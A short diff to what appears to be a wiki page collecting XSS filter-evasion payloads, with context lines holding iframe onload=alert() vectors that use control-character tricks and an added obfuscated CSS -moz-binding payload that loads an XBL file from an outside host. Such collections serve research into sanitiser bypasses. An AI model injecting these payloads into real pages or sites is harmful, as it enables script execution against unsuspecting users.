@@ -46,6 +46,8 @@ Gareth's examples
 <iframe "onload=alert(/XSS/)></iframe>
 <iframe<?php echo chr(11)?> onload=alert(/XSS/)></iframe>
 <iframe<?php echo chr(12)?> onload=alert(/XSS/)></iframe>
+<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk
+\/labs\/xbl\/xbl\.xml\#xss)>
 }}}
 
 Also
